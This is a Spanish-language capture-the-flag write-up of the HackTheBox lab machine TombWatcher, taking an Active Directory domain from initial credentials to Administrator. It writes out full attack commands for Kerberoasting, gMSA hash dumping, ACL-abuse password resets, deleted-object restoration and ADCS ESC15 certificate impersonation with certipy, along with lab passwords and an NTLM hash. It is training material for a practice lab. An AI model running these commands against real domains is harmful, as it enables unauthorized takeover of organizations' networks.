# TombWatcher
<img width="643" height="497" alt="image" src="https://github.com/user-attachments/assets/bc31a7ff-ca1f-43d2-96bd-e184cceb0776" />

>>> Credenciales Iniciales {henry / H3nry_987TGV!}

# Reconocimiento

```bash
nmap -Pn -n -sS -p- -sCV --min-rate 5000 10.10.11.72 -oN nmap.txt
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 12:54 -03
Nmap scan report for 10.10.11.72
Host is up (0.17s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-09 19:55:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-09T19:56:57+00:00; +4h00m19s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-09T19:56:57+00:00; +4h00m18s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-09T19:56:57+00:00; +4h00m18s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49735/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-09T19:56:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m18s, deviation: 0s, median: 4h00m17s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.97 seconds
```

# Configuraciones Iniciales

>>> Configuracion de /etc/hosts 
>>>
>>> Sincronizacion de reloj con el DC
>>>
>>> Configuracion de /etc/krb5.conf

### /etc/hosts

```bash
10.10.11.72 tombwatcher.htb DC01 DC01.tombwatcher.htb
```

### Sincronizacion de Reloj

```bash
ntpdate DC01
```

### Configuracion cliente Kerberos  /etc/krb5.conf


```bash
nano /etc/krb5.conf
```
```bash
[libdefaults]                
    default_realm = TOMBWATCHER.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    TOMBWATCHER.HTB = {
        kdc = DC01.tombwatcher.htb
        admin_server = DC01.tombwatcher.htb
    }

[domain_realm]
    .tombwatcher.htb = TOMBWATCHER.HTB
    tombwatcher.htb = TOMBWATCHER.HTB
```

# Recoleccion de informacion

primero vamos a validar las credenciales inciales

>>> SMB
```bash
nxc smb DC01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --shares
```

<img width="1895" height="252" alt="image" src="https://github.com/user-attachments/assets/69a2cdb6-bcdb-4630-a013-ea82f7e90750" />


>>> LDAP
```bash
nxc ldap DC01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!'
```

<img width="1895" height="108" alt="image" src="https://github.com/user-attachments/assets/3dd34a51-287b-457a-ab0b-89585f1c929d" />


ya que vemos son correctas esas credenciales, vamos a extraer informacion con `bloodhound-python`

```bash
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.10.11.72 -c ALl --zip
```

<img width="1895" height="398" alt="image" src="https://github.com/user-attachments/assets/d3d3deae-ca44-49e5-9e33-70170fb798b3" />

ahora exportamos el archivo `zip` a `bloodhound`

<img width="1895" height="1012" alt="image" src="https://github.com/user-attachments/assets/a1fdd378-67e0-4ebe-882e-31445bd0d9ab" />

como se observa, tenemos el permiso `WriteSPN` sobre el usuario `Alfred` asi que podemos abusar de este permiso para un ataque `Kerberoasting`

```bash
targetedKerberoast -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -f hashcat
```

<img width="1895" height="384" alt="image" src="https://github.com/user-attachments/assets/8e29aa41-2312-4b2c-b08e-d5bef737ba91" />


Guardamos el hash en un archivo y lo intentamos crackear con `hashcat`

```bash
hashcat -m 13100 -a 0 -w 4 -d 1 hash.txt /usr/share/wordlists/rockyou.txt
```
>>> Omitir los parametros -w y -d ya que son para usar mi GPU durante el crackeo

<img width="1895" height="1048" alt="image" src="https://github.com/user-attachments/assets/aad50395-020d-4e43-a526-866bfe9d04aa" />

>>> Crednciales {Alfred:basketball}

obtenemos la password asi que testeamos via smb y ldap

<img width="1895" height="353" alt="image" src="https://github.com/user-attachments/assets/5ee6d93e-e9a7-4176-a19f-b633facd8485" />

>>> credenciales validas y funcionales

Chequeamos el usuario `alfred` en `Bloodhound`

<img width="1920" height="1016" alt="image" src="https://github.com/user-attachments/assets/714d318d-88af-46a4-868b-38c3e19326ec" />


el proximo paso sera agregar el usuario `Alfred` al grupo `INFRASTRUCTURE`

```bash
bloodyAD -d tombwatcher.htb --host DC01 -u 'alfred' -p 'basketball' add groupMember "INFRASTRUCTURE" "Alfred"
```

<img width="1920" height="217" alt="image" src="https://github.com/user-attachments/assets/db86f7bb-90bd-4da6-8ab5-bf512d02d270" />

continuamos revisando la relacion en `Bloodhound`

<img width="1920" height="1015" alt="image" src="https://github.com/user-attachments/assets/263886eb-208c-4f24-83f9-8109f8b36f4f" />

## Extraccion de hash NTML de una cuenta `gMSA`

Como se observo en `Bloodhound` es posible abusar de este permiso siendo miembro del grupo `Infrastructure`, como ya somos miembros del grupo podemos abusar de esto y obtener el hash `NTLM`

```bash
gMSADumper -u 'alfred' -p 'basketball' -d tombwatcher.htb
```

<img width="1920" height="238" alt="image" src="https://github.com/user-attachments/assets/b89f094d-569a-46ed-8fb8-84aa21022dc9" />

continuamos observando en bloodhound que acciones puede hacer esta cuenta de maquina `ansible_dev$`

<img width="1920" height="1009" alt="image" src="https://github.com/user-attachments/assets/cbd651d0-b334-45dd-b663-17fafe3ba42d" />

La siguiente accion es cambiar la password del usuario `SAM`

>>> Primero vamos a solicitar un ticket Kerberos de la cuenta de maquina `ansible_dev$` y seteamos la variable de entorno KRB5CCNAME con el ticket generado

```bash
impacket-getTGT tombwatcher.htb/'ansible_dev$' -hashes :7bc5a56af89da4d3c03bc048055350f2 # solicitud del ticket kerberos
```
```bash
export KRB5CCNAME=ansible_dev\$.ccache
```

<img width="1920" height="194" alt="image" src="https://github.com/user-attachments/assets/573ac04d-9955-40a0-8103-3fd8b874a482" />

ahora si procedemos con el cambio de password para el usuario `SAM`

```bash
bloodyAD -d tombwatcher.htb --host DC01 -k set password 'SAM' 'Darksblack10*'
```

Testeamos las credenciales via SMB

```bahs
nxc smb DC01.tombwatcher.htb -u 'SAM' -p 'Darksblack10*' --shares
```

<img width="1920" height="305" alt="image" src="https://github.com/user-attachments/assets/09a1f1a3-ebde-4fa7-8107-a4e8f19ac8cb" />


ahora continuando con `Bloodhound` vemos que este usuario tiene permisos sobre otro usuario

<img width="1920" height="1014" alt="image" src="https://github.com/user-attachments/assets/0c6bb6f0-869c-4251-9a36-8ecbae66e164" />


ahora podemos ver que el usuario `SAM` tiene permiso `WriteOwner` sobre el usuario `JOHN` lo que implica que es posible modificar el propietario del usuario `JOHN`  

>>> Cambiamos el propietario

```bash
bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Darksblack10*' --host DC01 set owner "JOHN" "SAM" # Cambiamos el propietario del usuario john, que ahora el propietario es el usuario sam
```

>>> Ahora que el propietario del Usuario JOHN es el usuario SAM vamos a poder agregarle mas Privilegios para luego tomar el control total de JOHN, por lo que le agregamos el permiso genericAll

```bash
bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Darksblack10*' --host DC01 add genericAll "JOHN" "SAM"
```

>>> genericAll: Es un permiso que concede todos los derechos posibles sobre un objeto, equivalentes a ser "dueño absoluto". Incluye:
>>> 
>>> Cambiar contraseñas (Reset Password).
>>> 
>>> Modificar membresías de grupos (AddMember).
>>> 
>>> Editar atributos (WriteProperty).
>>> 
>>> Eliminar el objeto (Delete).


Ahora que ya tenemos control total sobre el usuario `JOHN` vamos a cambiar la password

```bash
bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Darksblack10*' --host DC01 set password "JOHN" "Darksblack10."
```

despues testeamos las credenciales

```bash
nxc smb DC01.tombwatcher.htb -u 'JOHN' -p 'Darksblack10.' --shares
```

<img width="1920" height="532" alt="image" src="https://github.com/user-attachments/assets/15cba730-d39b-4daf-b243-fdd0508ebe56" />


continuamos con las relaciones en `Bloodhound` y vemos que el usuario `JOHN` pertenece al grupo `REMOTE MANAGEMENT` lo cual nos permitira acceder via `WinRM`

<img width="1920" height="1012" alt="image" src="https://github.com/user-attachments/assets/922e4162-24da-4efe-b436-019df0fb1833" />

```bash
evil-winrm -i DC01 -u 'john' -p 'Darksblack10.'
```

<img width="1600" height="584" alt="image (16)" src="https://github.com/user-attachments/assets/7021dbc2-76c5-4d11-979e-e79963543587" />

en bloodhound tambien podemos ver

<img width="1920" height="1011" alt="image" src="https://github.com/user-attachments/assets/00bcbe9f-727a-4bac-bb1e-d7debaafa300" />

>>> Esto significa que el usuario JOHN puede manipular completamente el servicio ADCS del dominio



Con el control total de la unidad organizativa (OU), puede agregar una nueva ACE que heredará hasta los objetos bajo ella. La forma más sencilla y directa de abusar del control de la unidad organizativa (OU) es aplicarle una ACE GenericAll que herede todos los tipos de objeto. Esto se puede hacer usando dacledit de Impacket 

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Darksblack10.'
```

<img width="1920" height="173" alt="image" src="https://github.com/user-attachments/assets/3bfff607-6808-48be-9107-1541fc5740df" />

ahora desde la instancia de `evil-winrm` podemos conseguir un usuario el cual fue eliminado

```powershell
Get-ADObject -Filter {isDeleted -eq $true -and ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties *
```

<img width="1920" height="965" alt="image" src="https://github.com/user-attachments/assets/63f09e14-68eb-402e-8a49-156fca909172" />

Restauramos el usuario `cert_admin`

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```
>>> Activamos el usuario a traves del ObjectGUID 938182c3-bf0b-410a-9aaa-45c8e1a02ebf ya que es el que resulta tener los privilegios necesarios para
>>> poder explotar el certificado (Los demas ObjectGUID al testearlos no tenian los privilegios adecuados)

y verificamos

```powershell
Get-ADUser -Identity "cert_admin" -Properties *
```

<img width="1920" height="1007" alt="image" src="https://github.com/user-attachments/assets/8a6a9a79-6016-474a-82e5-8627a1db17cc" />

volvemos a recopilar informacion con `bloodhound-python`

```bash
bloodhound-python -u 'john' -p 'Darksblack10.' -d tombwatcher.htb -ns 10.10.11.72 -c ALl --zip
```

<img width="1920" height="471" alt="image" src="https://github.com/user-attachments/assets/61863385-4e61-4bd3-8a0a-72c5f9e292b4" />

exportamos a bloodhound

<img width="1920" height="1012" alt="image" src="https://github.com/user-attachments/assets/c692be60-59aa-4d75-8978-775e5aab9781" />

y vemos que tenemos privilegios sobre el usuario que restauramos, asi que vamos a cambiar su password

```bash
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb'  -u 'john' -p 'Darksblack10.' set password 'cert_admin' 'Darksblack100'
```

una vez cambiada la password vamos a chequear que certificados pueden ser vulnerables

```bash
certipy-ad find -u cert_admin -p "Darksblack100" -dc-ip 10.10.11.72
```
```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20250809233550_Certipy.txt'
[*] Wrote text output to '20250809233550_Certipy.txt'
[*] Saving JSON output to '20250809233550_Certipy.json'
[*] Wrote JSON output to '20250809233550_Certipy.json'
```
```bash
cat 20250809233550_Certipy.txt
```

<img width="1920" height="1012" alt="image" src="https://github.com/user-attachments/assets/4fefdbb6-9ef0-4dbe-b75e-879acbb776a5" />

conseguimos un posible vector de ataque, Principales problemas de seguridad en este `Template`

1. `EnrolleeSuppliesSubject: True` permite que el usuario que solicita el certificado defina el nombre del sujeto y los SANs
2. `Requires Manager Approval: False` Los certificados se emiten automáticamente sin revisión
3. Permisos de inscripción amplios
4. Resulta ser vulnerable a ESC15

Ahora para explotar una plantilla vulnerable a `ESC15` lo hacemos asi:

```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Darksblack100' -dc-ip '10.10.11.72' -target 'tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
```
>>> Con este comando de Certipy-ad estamos solicitando un certificado de ADCS con la finalidad de suplantar al administrador del dominio (administrator@tombwatcher.htb) para autenticación en Kerberos/NTLM.

<img width="1920" height="277" alt="image" src="https://github.com/user-attachments/assets/0036a662-93e8-43fc-ad80-a67013210282" />


Ya con el certificado `administrator.pfx` vamos autenticarnos para cambiar la password de administrator

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
```

<img width="1920" height="821" alt="image" src="https://github.com/user-attachments/assets/e172adb8-38c5-4147-b22e-d8dfc946e97b" />

ahora solo tenemos que autenticarnos via `WinRrm`

```bash
evil-winrm -i DC01.tombwatcher.htb -u Administrator -p 'Darksblack1234'
```

<img width="1920" height="959" alt="image" src="https://github.com/user-attachments/assets/c2390a48-0de0-4aee-8cb2-98fda51a42ea" />

>>> Conseguimos acceso como administrador del sistema!!!!!!!










